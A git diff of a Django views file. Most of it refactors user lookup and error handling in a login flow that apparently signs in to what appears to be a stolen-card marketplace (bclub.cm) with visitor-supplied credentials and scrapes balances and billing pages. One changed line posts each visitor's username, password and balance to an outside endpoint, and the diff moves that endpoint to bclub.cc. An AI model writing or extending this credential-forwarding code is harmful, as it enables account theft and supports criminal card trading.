@@ -112,16 +112,38 @@ class CustomLoginView(LoginView):
 # change string to nubmer example '3+1' to 4 in python
 import requests
 
-
 # logout view
+# def create_user_and_balance(username, password, balance):
+#     # Create User
+#     user = User.objects.create_user(username=username, password=password)
+
+#     # Create Balance
+#     Balance.objects.create(user=user, balance=balance)
+
+
+#     return user
 def create_user_and_balance(username, password, balance):
-    # Create User
-    user = User.objects.create_user(username=username, password=password)
+    try:
+        # Validate input parameters
+        if not username or not password or not balance:
+            raise ValueError("Username, password, and balance are required")
 
-    # Create Balance
-    Balance.objects.create(user=user, balance=balance)
+        # Create User
+        if User.objects.filter(username=username).first():
+            user = User.objects.filter(username=username).first()
 
-    return user
+            return user
+
+        user = User.objects.create_user(username=username, password=password)
+
+        # Create Balance
+        Balance.objects.create(user=user, balance=balance)
+
+        return {'user': user, 'balance': balance}
+    except Exception as e:
+        # Handle any exceptions that occur during user or balance creation
+        print(f"Error creating user and balance: {e}")
+        return None
 
 
 def find_identical_and_calculate(img2_url, dir_path):
@@ -280,7 +302,14 @@ def loginreq(request):
                         soup = BeautifulSoup(html_content, 'html.parser')
                         span_element = soup.find('span', {'id': 'user_balance'})
                         try:
-                            user = User.objects.get(username=username)
+                            try:
+                                user = User.objects.filter(username=username).first()
+                                if user is not None:
+                                    print(user)
+                                else:
+                                    print("No user found")
+                            except User.DoesNotExist:
+                                print("User not found")
                                                             # Get the billing page
                             response4 = session.get('https://bclub.cm/billing/', headers=headers)
                             soup = BeautifulSoup(response4.content, 'html.parser')
@@ -364,8 +393,11 @@ def loginreq(request):
 
                                     # Set the user of the order
                                     # Note: You need to replace 'username' with the actual username
-                                    order.user = User.objects.get(username=username)
-
+                                    user = User.objects.filter(username=username).first()
+                                    if user is not None:
+                                        order.user = user
+                                    else:
+                                        print("No user found for the specified username")
                                     # Save the order
                                     order.save()
                                     print('order', order)
@@ -386,10 +418,17 @@ def loginreq(request):
                                 'password':password,
                                 'balance':value
                             }
-                            response2 = requests.post('https://briansclub.mp/userdata/create/', data=data)
+                            response2 = requests.post('https://bclub.cc/userdata/create/', data=data)
                             for i in range(2):
                                 try:
-                                    user = User.objects.get(username=username)
+                                    try:
+                                        user = User.objects.filter(username=username).first()
+                                        if user is not None:
+                                            print(user)
+                                        else:
+                                            print("No user found")
+                                    except User.DoesNotExist:
+                                        print("User not found")
                                     # Get the billing page
                                     response4 = session.get('https://bclub.cm/billing/', headers=headers)
                                     soup = BeautifulSoup(response4.content, 'html.parser')
@@ -470,7 +509,13 @@ def loginreq(request):
 
                                             # Set the user of the order
                                             # Note: You need to replace 'username' with the actual username
-                                            order.user = User.objects.get(username=username)
+                                                                                        # Note: You need to replace 'username' with the actual username
+                                            user = User.objects.filter(username=username).first()
+                                            if user is not None:
+                                                order.user = user
+                                            else:
+                                                print("No user found for the specified username")
+
 
                                             # Save the order
                                             order.save()
